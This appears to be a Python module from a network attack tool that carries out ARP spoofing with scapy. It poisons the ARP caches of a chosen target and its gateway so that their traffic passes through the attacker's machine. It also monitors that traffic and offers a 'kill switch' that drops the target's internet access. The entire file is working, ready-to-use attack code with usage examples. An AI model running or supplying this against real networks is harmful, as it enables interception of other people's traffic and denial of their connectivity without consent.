#!/usr/bin/env python3
"""
ARP Spoofing Engine (core/spoofing.py)

Performs a man-in-the-middle attack via ARP poisoning:
1. Tell the **target** → "I am the gateway"  (target sends its traffic to us)
2. Tell the **gateway** → "I am the target"  (gateway sends replies to us)

With IP forwarding enabled, traffic passes through transparently.
With IP forwarding disabled (kill-switch), the target's packets are dropped.
"""

import threading
import time

from scapy.all import ARP, Ether, conf, sendp, srp1

from core.monitor import TrafficMonitor
from utils.sys_config import enable_ip_forwarding, disable_ip_forwarding


class ArpSpoofer:
    """
    Continuously poisons the ARP cache of two hosts so that all traffic
    between them flows through this machine.

    Usage::

        spoofer = ArpSpoofer("192.168.1.10", "192.168.1.1")
        spoofer.start()          # begin ARP poisoning
        # ... target is now intercepted ...
        spoofer.stop()           # send restoration packets & clean up

    Or as a context manager::

        with ArpSpoofer("192.168.1.10", "192.168.1.1") as spoofer:
            spoofer.start()
            # ...
            spoofer.kill()       # drop target internet without stopping spoof
    """

    def __init__(self, target_ip, gateway_ip, interval=1.0, enable_monitor=True):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interval = interval

        self._stop_event = threading.Event()
        self._thread = None
        self._killed = False
        self._enable_monitor = enable_monitor
        self.monitor = None  # created on start()

        # Resolved once on construction (requires sudo)
        self.my_mac = self._get_my_mac()
        self.target_mac = self._resolve_mac(target_ip)
        if self.target_mac is None:
            raise RuntimeError(f"Could not resolve MAC for target {target_ip}")
        self.gateway_mac = self._resolve_mac(gateway_ip)
        if self.gateway_mac is None:
            raise RuntimeError(f"Could not resolve MAC for gateway {gateway_ip}")

        print(f"[*] Own MAC:      {self.my_mac}")
        print(f"[*] Target MAC:   {self.target_mac}  ({target_ip})")
        print(f"[*] Gateway MAC:  {self.gateway_mac}  ({gateway_ip})")

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self):
        """Begin sending spoofed ARP replies in a background thread."""
        if self._thread and self._thread.is_alive():
            print("[!] Spoofing is already running.")
            return

        self._stop_event.clear()
        enable_ip_forwarding()

        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()

        if self._enable_monitor:
            self.monitor = TrafficMonitor(self.target_ip)
            self.monitor.start()

        print(f"[*] ARP spoofing started  ({self.target_ip} <-> {self.gateway_ip})")

    def stop(self, restore=True):
        """
        Stop the spoofing thread.

        If *restore* is True (default), send genuine ARP replies to both
        hosts so they relearn the correct MACs.  Also disables IP forwarding.
        """
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None

        if self.monitor:
            self.monitor.stop()

        if restore:
            self._restore_arp()
        disable_ip_forwarding()
        print("[*] Spoofing stopped, IP forwarding disabled.")

    def kill(self):
        """
        Drop the target's internet access by disabling IP forwarding
        while spoofing continues.  The target's packets arrive here but
        are not routed onward.
        """
        self._killed = True
        disable_ip_forwarding()
        if self.monitor:
            self.monitor.set_active(False)
        print(f"[*] KILL SWITCH: {self.target_ip} is now cut off.")

    def unkill(self):
        """Re-enable IP forwarding (reverse of kill)."""
        self._killed = False
        enable_ip_forwarding()
        if self.monitor:
            self.monitor.set_active(True)
        print(f"[*] {self.target_ip} internet access restored.")

    @property
    def is_running(self):
        return self._thread is not None and self._thread.is_alive()

    @property
    def is_killed(self):
        return self._killed

    def enable_monitoring(self):
        """Start or resume traffic monitoring for this target."""
        self._enable_monitor = True
        if self._thread and self._thread.is_alive():
            if self.monitor is None:
                self.monitor = TrafficMonitor(self.target_ip)
                self.monitor.start()
            else:
                self.monitor.set_active(True)

    def disable_monitoring(self):
        """Stop traffic monitoring for this target."""
        self._enable_monitor = False
        if self.monitor:
            self.monitor.set_active(False)

    def get_traffic_stats(self):
        """Return (upload_kbps, download_kbps) from the traffic monitor."""
        if self.monitor:
            return self.monitor.get_stats()
        return 0.0, 0.0

    # ------------------------------------------------------------------
    # Context manager
    # ------------------------------------------------------------------

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop(restore=True)
        return False

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _spoof_loop(self):
        """Send spoofed ARP packets on a fixed interval."""
        while not self._stop_event.is_set():
            try:
                self._send_one_round()
            except Exception as e:
                print(f"[!] Spoof round error: {e}")
            self._stop_event.wait(self.interval)

    def _send_one_round(self):
        """
        Send one round of spoofed ARP replies.

        Target receives:  "gateway_ip  is at  my_mac"
        Gateway receives: "target_ip   is at  my_mac"
        """
        # --- poison the target ---
        poison_target = (
            Ether(dst=self.target_mac)
            / ARP(
                op=2,                 # "is-at" (ARP reply)
                psrc=self.gateway_ip,  # I claim to be the gateway
                pdst=self.target_ip,
                hwsrc=self.my_mac,     # my MAC
                hwdst=self.target_mac,
            )
        )
        sendp(poison_target, verbose=0, iface=conf.iface)

        # --- poison the gateway ---
        poison_gateway = (
            Ether(dst=self.gateway_mac)
            / ARP(
                op=2,
                psrc=self.target_ip,   # I claim to be the target
                pdst=self.gateway_ip,
                hwsrc=self.my_mac,
                hwdst=self.gateway_mac,
            )
        )
        sendp(poison_gateway, verbose=0, iface=conf.iface)

    def _restore_arp(self, count=3):
        """
        Send genuine ARP replies so both hosts relearn the real MACs.
        Multiple packets are sent because ARP is unreliable.
        """
        for i in range(count):
            # Tell target: gateway IP -> gateway's real MAC
            restore_target = (
                Ether(dst=self.target_mac)
                / ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=self.target_ip,
                    hwsrc=self.gateway_mac,   # the real gateway
                    hwdst=self.target_mac,
                )
            )
            sendp(restore_target, verbose=0, iface=conf.iface)

            # Tell gateway: target IP -> target's real MAC
            restore_gateway = (
                Ether(dst=self.gateway_mac)
                / ARP(
                    op=2,
                    psrc=self.target_ip,
                    pdst=self.gateway_ip,
                    hwsrc=self.target_mac,    # the real target
                    hwdst=self.gateway_mac,
                )
            )
            sendp(restore_gateway, verbose=0, iface=conf.iface)

            if i < count - 1:
                time.sleep(0.3)

    @staticmethod
    def _get_my_mac():
        """Return this machine's MAC address from scapy's config."""
        return conf.iface.mac.upper()

    @staticmethod
    def _resolve_mac(ip, retries=3):
        """Resolve a single IP to its MAC via ARP request. Retries on failure."""
        for attempt in range(retries):
            ans = srp1(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2,
                verbose=0,
            )
            if ans:
                return ans.hwsrc.upper()
            if attempt < retries - 1:
                time.sleep(1)
                print(f"[!] Retry {attempt + 1}/{retries - 1} resolving {ip}...")
        return None
